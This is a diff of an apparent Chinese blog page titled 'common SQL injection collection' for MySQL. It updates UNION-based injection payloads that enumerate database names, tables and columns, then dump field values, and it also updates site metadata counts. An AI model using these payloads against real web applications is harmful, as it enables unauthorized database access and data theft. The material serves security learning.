@@ -88,7 +88,7 @@
 <meta property="og:site_name" content="Pursu0 blogs">
 <meta property="og:description" content="Mysql">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-08-29T15:33:49.719Z">
+<meta property="og:updated_time" content="2019-09-03T10:10:45.328Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="sql注入常用合集">
 <meta name="twitter:description" content="Mysql">
@@ -405,19 +405,19 @@
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2.</span>...,n</span><br></pre></td></tr></table></figure>
 
 <p>获取系统数据库名</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="literal">null</span>,<span class="literal">null</span>,schema_name <span class="keyword">from</span> information_schema.schemata</span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,...,schema_name <span class="keyword">from</span> information_schema.schemata,...</span><br></pre></td></tr></table></figure>
 
 <p>直接获取当前数据库名</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="literal">null</span>,null...,<span class="keyword">database</span>()</span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2.</span>..,<span class="keyword">database</span>()</span><br></pre></td></tr></table></figure>
 
 <p>获取数据库中的表</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="literal">null</span>,<span class="literal">null</span>,...,<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schama.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()</span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,...,<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schama.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()</span><br></pre></td></tr></table></figure>
 
 <p>获取表中的字段</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="literal">null</span>,<span class="literal">null</span>,...,<span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">and</span> table_name=<span class="string">'&lt;表名&gt;'</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,...,<span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">and</span> table_name=<span class="string">'&lt;表名&gt;'</span></span><br></pre></td></tr></table></figure>
 
 <p>获取各个字段值</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="literal">null</span>,<span class="keyword">group_concat</span>(&lt;字段<span class="number">1</span>&gt;,&lt;字段<span class="number">2</span>&gt;) <span class="keyword">from</span> &lt;当前表名&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(&lt;字段<span class="number">1</span>&gt;,&lt;字段<span class="number">2</span>&gt;) <span class="keyword">from</span> &lt;当前表名&gt;</span><br></pre></td></tr></table></figure>
 
 <h2 id="UNION-JOIN注入"><a href="#UNION-JOIN注入" class="headerlink" title="UNION+JOIN注入"></a>UNION+JOIN注入</h2><blockquote>
 <p>适用于：逗号被过滤</p>
@@ -668,7 +668,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-count">6</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -679,7 +679,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-count">4</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
